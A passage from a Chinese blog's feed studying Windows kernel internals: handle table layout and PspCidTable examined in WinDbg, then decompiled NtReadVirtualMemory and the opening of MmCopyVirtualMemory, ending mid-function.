class="number">00000000</span></span><br><span class="line">a4cfc030  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a4cfc040  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a4cfc050  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a4cfc060  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a4cfc070  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure><p>三级句柄表同理可得。其实跟分页是同理的，例如常见的 10-10-12 是二级页表 2-9-9-12 是三级页表。不过需要注意的是，32位的系统中，每个二级句柄表可以存下 1024 个句柄指针，所以三级句柄表可能实际跟二级句柄表又有些许差异，不过影响不大。不过这里有一个小技巧，句柄表初始化的时候，在 AccessMode 的位置上会显示后一个句柄的实际值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dq ab7c1000</span><br><span class="line">ReadVirtual: ab7c1000 <span class="keyword">not</span> properly sign extended</span><br><span class="line">ab7c1000  fffffffe`<span class="number">00000000</span> <span class="number">0000000</span>9`ab552a69</span><br><span class="line">ab7c1010  <span class="number">00000003</span>`<span class="number">98453741</span> <span class="number">00100020</span>`<span class="number">8889</span>c259</span><br><span class="line">ab7c1020  <span class="number">001</span>f0003`<span class="number">87</span>c461f9 <span class="number">001</span>f0001`<span class="number">882</span>bfc31</span><br><span class="line">ab7c1030  <span class="number">001</span>f0001`<span class="number">86</span>a20ee9 <span class="number">00100020</span>`<span class="number">86</span>a28be1</span><br><span class="line">ab7c1040  <span class="number">0000000</span>9`ab5a0c39 <span class="number">0002001</span>9`ab61a201</span><br><span class="line">ab7c1050  <span class="number">00000001</span>`ab6c<span class="number">69e1</span> <span class="number">001</span>fffff`<span class="number">887</span>fc871</span><br><span class="line">ab7c1060  <span class="number">00000034</span>`<span class="number">00000000</span> <span class="number">0000003</span>8`<span class="number">00000000</span></span><br><span class="line">ab7c1070  <span class="number">0000003</span>c`<span class="number">00000000</span> <span class="number">00000040</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure><p>可以很清楚看到后面连成片的 <code>0x34</code>，<code>0x38</code>，<code>0x3c</code> 等，0x34 所在的位置句柄值就是 0x30，同理，前面就找到了 <code>0x2C</code> 的句柄 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">001fffff`887fc871</span><br></pre></td></tr></table></figure><p>可以发现 <code>AccessMode</code> 是 <code>0xFFFF</code> 也就是 <code>PROCESS_ALL_ACCESS</code> 的赋值，最高三位未赋予实际意义（也就是说0x1FFF就足以表示 <code>PROCESS_ALL_ACCESS</code>），取何值不影响。</p><p>将取出来的值去掉最低三位拿到的地址就是 <code>887fc870</code>，这是一个 <code>_OBJECT_HEADER</code> 结构，如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_HEADER <span class="number">887</span>fc870</span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   <span class="number">+0x000</span> PointerCount     : <span class="number">0</span>n317</span><br><span class="line">   <span class="number">+0x004</span> HandleCount      : <span class="number">0</span>n8</span><br><span class="line">   <span class="number">+0x004</span> NextToFree       : <span class="number">0x00000008</span> Void</span><br><span class="line">   <span class="number">+0x008</span> Lock             : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x00c</span> TypeIndex        : <span class="number">0x7</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x00d TraceFlags       : 0 &#x27;</span>&#x27;</span><br><span class="line">   <span class="number">+0x00e</span> InfoMask         : <span class="number">0x8</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x00f Flags            : 0 &#x27;</span>&#x27;</span><br><span class="line">   <span class="number">+0x010</span> ObjectCreateInfo : <span class="number">0x8874e040</span> _OBJECT_CREATE_INFORMATION</span><br><span class="line">   <span class="number">+0x010</span> QuotaBlockCharged : <span class="number">0x8874e040</span> Void</span><br><span class="line">   <span class="number">+0x014</span> SecurityDescriptor : <span class="number">0x922ba4aa</span> Void</span><br><span class="line">   <span class="number">+0x018</span> Body             : _QUAD</span><br></pre></td></tr></table></figure><p>这里的 <code>TypeIndex</code> 可以辨认该句柄是什么类型的句柄，据说早年是用一个字符串标识的，个人感觉可能是浪费内存了就使用这个 TypeIndex 去存储类型，其中 <code>+0x18</code> 的偏移就是句柄对应的 <code>EPROCESS</code> 的结构。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS <span class="number">887</span>fc870<span class="number">+0x18</span></span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   <span class="number">+0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   <span class="number">+0x16c</span> ImageFileName    : [<span class="number">15</span>]  <span class="string">&quot;explorer.exe&quot;</span></span><br><span class="line">   <span class="number">+0x17b</span> PriorityClass    : <span class="number">0x2</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>成功找到对应的 <code>EPROCESS</code> 结构，可以看到，这个地址就是 <code>explorer.exe</code> 进程实际 <code>EPROCESS</code> 结构的地址（可在 <code>!process 0 0</code> 命令输出）。</p><h3 id="全局句柄表"><a href="#全局句柄表" class="headerlink" title="全局句柄表"></a>全局句柄表</h3><p>全局句柄表指针由内核的全局变量 <code>PspCidTable</code> 维护，故此全局句柄表因此又被称为<strong>CID句柄表</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd PspCidTable</span><br><span class="line"><span class="number">83</span>d7ad54  <span class="number">8e801070</span> <span class="number">00000000</span> <span class="number">80000020</span> <span class="number">00000101</span></span><br><span class="line"><span class="number">83</span>d7ad64  <span class="number">800002e0</span> <span class="number">80000024</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">83</span>d7ad74  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000113</span></span><br><span class="line"><span class="number">83</span>d7ad84  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">83</span>d2d482 <span class="number">00000000</span></span><br><span class="line"><span class="number">83</span>d7ad94  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">0000000</span>8</span><br><span class="line"><span class="number">83</span>d7ada4  <span class="number">00000000</span> <span class="number">83</span>d7ada8 <span class="number">83</span>d7ada8 <span class="number">00000000</span></span><br><span class="line"><span class="number">83</span>d7adb4  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">83</span>d7adc4  <span class="number">00000000</span> <span class="number">80</span>dc8c38 <span class="number">80</span>dc4c38 <span class="number">00000000</span></span><br><span class="line">kd&gt; dt _HANDLE_TABLE <span class="number">8e801070</span></span><br><span class="line">ntdll!_HANDLE_TABLE</span><br><span class="line">   <span class="number">+0x000</span> TableCode        : <span class="number">0x8e804000</span></span><br><span class="line">   <span class="number">+0x004</span> QuotaProcess     : (null) </span><br><span class="line">   <span class="number">+0x008</span> UniqueProcessId  : (null) </span><br><span class="line">   <span class="number">+0x00c</span> HandleLock       : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x010</span> HandleTableList  : _LIST_ENTRY [ <span class="number">0x8e801080</span> - <span class="number">0x8e801080</span> ]</span><br><span class="line">   <span class="number">+0x018</span> HandleContentionEvent : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x01c</span> DebugInfo        : (null) </span><br><span class="line">   <span class="number">+0x020</span> ExtraInfoPages   : <span class="number">0</span>n0</span><br><span class="line">   <span class="number">+0x024</span> Flags            : <span class="number">1</span></span><br><span class="line">   <span class="number">+0x024</span> StrictFIFO       : <span class="number">0</span>y1</span><br><span class="line">   <span class="number">+0x028</span> FirstFreeHandle  : <span class="number">0x178</span></span><br><span class="line">   <span class="number">+0x02c</span> LastFreeHandleEntry : <span class="number">0x8e8041e0</span> _HANDLE_TABLE_ENTRY</span><br><span class="line">   <span class="number">+0x030</span> HandleCount      : <span class="number">0x1a7</span></span><br><span class="line">   <span class="number">+0x034</span> NextHandleNeedingPool : <span class="number">0x800</span></span><br><span class="line">   <span class="number">+0x038</span> HandleCountHighWatermark : <span class="number">0x1a7</span></span><br><span class="line">kd&gt; dq <span class="number">0x8e804000</span></span><br><span class="line"><span class="number">8e804000</span>  fffffffe`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">868e5901</span></span><br><span class="line"><span class="number">8e804010</span>  <span class="number">00000000</span>`<span class="number">868e5629</span> <span class="number">00000000</span>`<span class="number">86944431</span></span><br><span class="line"><span class="number">8e804020</span>  <span class="number">00000000</span>`<span class="number">86944921</span> <span class="number">00000000</span>`<span class="number">86940</span>d49</span><br><span class="line"><span class="number">8e804030</span>  <span class="number">00000000</span>`<span class="number">86940931</span> <span class="number">00000000</span>`<span class="number">86934</span>d49</span><br><span class="line"><span class="number">8e804040</span>  <span class="number">00000000</span>`<span class="number">86934</span>a71 <span class="number">00000000</span>`<span class="number">86930</span>d49</span><br><span class="line"><span class="number">8e804050</span>  <span class="number">00000000</span>`<span class="number">86930</span>a71 <span class="number">00000000</span>`<span class="number">8691</span>cd49</span><br><span class="line"><span class="number">8e804060</span>  <span class="number">00000000</span>`<span class="number">8691</span>ca71 <span class="number">00000000</span>`<span class="number">8690</span>cd49</span><br><span class="line"><span class="number">8e804070</span>  <span class="number">00000000</span>`<span class="number">8690</span>ca71 <span class="number">00000000</span>`<span class="number">868</span>f4d49</span><br></pre></td></tr></table></figure><p>全局句柄表顾名思义不依附于任何一个进程。每个进程和线程都有一个唯一的编号：<code>PID</code>和<code>TID</code>，这两个值其实就是全局句柄表中的索引，统称<code>CID</code>。进程和线程的查询，主要是以下三个函数，按照给定的<code>PID</code>或<code>TID</code>从<code>PspCidTable</code>从查找相应的进线程对象：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PsLookupProcessThreadByCid</span>(x, x, x);</span><br><span class="line"><span class="built_in">PsLookupProcessByProcessId</span>(HANDLE ProcessId, PEPROCESS *Process);</span><br><span class="line"><span class="built_in">PsLookupThreadByThreadId</span>(HANDLE ThreadId, PETHREAD *Thread);  </span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15823780.html">https://www.cnblogs.com/wingsummer/p/15823780.html</a></li></ul>]]></content>
    
    
    <summary type="html">来了解一下Windows内核的句柄表。</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="句柄表" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%8F%A5%E6%9F%84%E8%A1%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windows进程与线程学习——深入研究线程调度（2）</title>
    <link href="https://xia0ji233.github.io/2025/01/25/WindowsProcess5/"/>
    <id>https://xia0ji233.github.io/2025/01/25/WindowsProcess5/</id>
    <published>2025-01-25T14:00:00.000Z</published>
    <updated>2025-01-25T14:35:50.481Z</updated>
    
    <content type="html"><![CDATA[<p>深入研究一下线程调度，由于篇幅较多，分章节分析，第二篇。</p><span id="more"></span><h2 id="进程挂靠"><a href="#进程挂靠" class="headerlink" title="进程挂靠"></a>进程挂靠</h2><p>一个进程可以包含多个线程，线程结构体中会指向自己所属的进程。切换到这个线程的时候，会将对应的 cr3 切换到该进程的页目录基址，那么这个线程就可以访问这个进程的所有资源了。</p><p>前面逆向的时候看到过，在切换 cr3 的时候，是拿到了 <code>KTHREAD.ApcState.Process</code>，而并不是 <code>KTHREAD.Process</code>，这个因为没学 <code>APC</code> 暂时保留一些疑问。一个线程在切换时改成其它进程的 <code>CR3</code> 值就称为<strong>进程挂靠</strong>。</p><p>进程挂靠在 Windows 内核层有一个关键 API，叫 <code>KeStackAttachProcess</code>，由于大量用到了 APC 的知识，因此选择学了 APC 之后再分析，mark一下，有空回来更新<a href="">传送门</a>（现在还是空的）</p><h2 id="跨进程读写"><a href="#跨进程读写" class="headerlink" title="跨进程读写"></a>跨进程读写</h2><p>一个进程肯定不能够直接读写另一个进程，因为它们页目录基址都不同，不会正常情况下不会有共享的物理页，但是通常来说，内核空间每个进程都是共享的，所以跨进程读写可以这么操作：</p><p>假设 A 进程要读取 B 进程的内存，那么先挂靠到 B 进程，从对应的内存读取数据到内核区。再挂靠回 A 进程，将内存写入 A 进程的用户空间。</p><p>跨进程读的视图如下所示</p><img src="/2025/01/25/WindowsProcess5/1.png" class=""><p>跨进程写的试图如下所示</p><img src="/2025/01/25/WindowsProcess5/2.png" class=""><h3 id="NtReadVirtualMemory"><a href="#NtReadVirtualMemory" class="headerlink" title="NtReadVirtualMemory"></a>NtReadVirtualMemory</h3><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>下面来分析 <code>NtReadVirtualMemory</code> 函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">NtReadVirtualMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T NumberOfBytesToRead,</span></span></span><br><span class="line"><span class="params"><span class="function">    PSIZE_T NumberOfBytesRead)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _KTHREAD *CurrentThread; <span class="comment">// edi</span></span><br><span class="line">    PSIZE_T NumberOfBytesReadPtr; <span class="comment">// ebx</span></span><br><span class="line">    PSIZE_T v7; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">int</span> v9; <span class="comment">// [esp+14h] [ebp-24h] BYREF</span></span><br><span class="line">    MEMORY_CACHING_TYPE Object; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line">    DEVICE_RELATION_TYPE AccessMode; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">    <span class="type">int</span> v12; <span class="comment">// [esp+34h] [ebp-4h]</span></span><br><span class="line">    PSIZE_T NumberOfBytesReada; <span class="comment">// [esp+50h] [ebp+18h]</span></span><br><span class="line"></span><br><span class="line">    CurrentThread = <span class="built_in">KeGetCurrentThread</span>();</span><br><span class="line">    <span class="built_in">LOBYTE</span>(AccessMode) = CurrentThread-&gt;PreviousMode;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)AccessMode )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">char</span> *)BaseAddress + NumberOfBytesToRead &lt; BaseAddress</span><br><span class="line">            || (<span class="type">char</span> *)Buffer + NumberOfBytesToRead &lt; Buffer</span><br><span class="line">            || (<span class="type">char</span> *)BaseAddress + NumberOfBytesToRead &gt; MmHighestUserAddress</span><br><span class="line">            || (<span class="type">char</span> *)Buffer + NumberOfBytesToRead &gt; MmHighestUserAddress )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0xC0000005</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        NumberOfBytesReadPtr = NumberOfBytesRead;</span><br><span class="line">        <span class="keyword">if</span> ( NumberOfBytesRead )</span><br><span class="line">        &#123;</span><br><span class="line">            v12 = <span class="number">0</span>;</span><br><span class="line">            v7 = NumberOfBytesRead;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)NumberOfBytesRead &gt;= MmUserProbeAddress )</span><br><span class="line">                v7 = (PSIZE_T)MmUserProbeAddress;</span><br><span class="line">            *v7 = *v7;</span><br><span class="line">            v12 = <span class="number">-2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        NumberOfBytesReadPtr = NumberOfBytesRead;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    NumberOfBytesReada = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( NumberOfBytesToRead )</span><br><span class="line">    &#123;</span><br><span class="line">        NumberOfBytesReada = (PSIZE_T)<span class="built_in">ObReferenceObjectByHandle</span>(</span><br><span class="line">            ProcessHandle,</span><br><span class="line">            <span class="number">0x10u</span>,</span><br><span class="line">            (POBJECT_TYPE)PsProcessType,</span><br><span class="line">            AccessMode,</span><br><span class="line">            (PVOID *)&amp;Object,</span><br><span class="line">            <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !NumberOfBytesReada )</span><br><span class="line">        &#123;</span><br><span class="line">            NumberOfBytesReada = (PSIZE_T)<span class="built_in">MmCopyVirtualMemory</span>(</span><br><span class="line">                (<span class="keyword">struct</span> _KPROCESS *)Object,</span><br><span class="line">                (<span class="type">char</span> *)BaseAddress,</span><br><span class="line">                CurrentThread-&gt;ApcState.Process,</span><br><span class="line">                Buffer,</span><br><span class="line">                NumberOfBytesToRead,</span><br><span class="line">                AccessMode,</span><br><span class="line">                (SIZE_T *)&amp;v9);</span><br><span class="line">            <span class="built_in">ObfDereferenceObject</span>((PVOID)Object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( NumberOfBytesReadPtr )</span><br><span class="line">    &#123;</span><br><span class="line">        *NumberOfBytesReadPtr = v9;</span><br><span class="line">        v12 = <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (NTSTATUS)NumberOfBytesReada;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面做一个基本的判断，如果先前模式非 0，也就是说进来的时候不是 CPU 等级不为 R0，那么判断读取的虚拟内存地址是否在用户空间，如果不在就说明 R3 调用的接口试图读取内核的地址，那么直接拒绝返回 <code>0xC0000005</code> 即可。</p><p>做完一系列检查之后会调用 <code>MmCopyVirtualMemory</code>，下面来分析这个函数</p><h3 id="MmCopyVirtualMemory"><a href="#MmCopyVirtualMemory" class="headerlink" title="MmCopyVirtualMemory"></a>MmCopyVirtualMemory</h3><h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">MmCopyVirtualMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _KPROCESS *Target_Process,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span> *src,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _KPROCESS *Origin_Process,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">volatile</span> <span class="type">void</span> *dest,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    DEVICE_RELATION_TYPE AccessMode,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T *NumberOfBytesCopy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SIZE_T InitialSize; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> flag_1; <span class="comment">// ecx</span></span><br><span class="line">    _KTHREAD *v9; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> flag_1_copy; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">char</span> v12; <span class="comment">// [esp+10h] [ebp-2D4h] BYREF</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_MDL</span> MemoryDescriptorList; <span class="comment">// [esp+210h] [ebp-D4h] BYREF</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_KAPC_STATE</span> ApcState; <span class="comment">// [esp+268h] [ebp-7Ch] BYREF</span></span><br><span class="line">    <span class="type">int</span> v15; <span class="comment">// [esp+290h] [ebp-54h]</span></span><br><span class="line">    _KTHREAD *CurrentThread; <span class="comment">// [esp+294h] [ebp-50h]</span></span><br><span class="line">    <span class="type">int</span> v17; <span class="comment">// [esp+298h] [ebp-4Ch]</span></span><br><span class="line">    <span class="type">int</span> v18; <span class="comment">// [esp+29Ch] [ebp-48h]</span></span><br><span class="line">    PMDL p_MemoryDescriptorList; <span class="comment">// [esp+2A0h] [ebp-44h]</span></span><br><span class="line">    <span class="type">void</span> *DestPtr; <span class="comment">// [esp+2A4h] [ebp-40h]</span></span><br><span class="line">    SIZE_T restLength; <span class="comment">// [esp+2ACh] [ebp-38h]</span></span><br><span class="line">    PVOID mdlAddress; <span class="comment">// [esp+2B0h] [ebp-34h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v23; <span class="comment">// [esp+2B7h] [ebp-2Dh]</span></span><br><span class="line">    <span class="type">void</span> *Src; <span class="comment">// [esp+2B8h] [ebp-2Ch]</span></span><br><span class="line">    PVOID P; <span class="comment">// [esp+2BCh] [ebp-28h]</span></span><br><span class="line">    <span class="type">size_t</span> MaxCount; <span class="comment">// [esp+2C0h] [ebp-24h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flag; <span class="comment">// [esp+2C4h] [ebp-20h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v28; <span class="comment">// [esp+2E0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !Length )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    *NumberOfBytesCopy = <span class="number">0</span>;</span><br><span class="line">    flag = <span class="number">2</span>;</span><br><span class="line">    Src = src;</span><br><span class="line">    DestPtr = (<span class="type">void</span> *)dest;</span><br><span class="line">    restLength = Length;</span><br><span class="line">    p_MemoryDescriptorList = &amp;MemoryDescriptorList;</span><br><span class="line">    CurrentThread = <span class="built_in">KeGetCurrentThread</span>();</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    P = <span class="number">0</span>;</span><br><span class="line">    v15 = 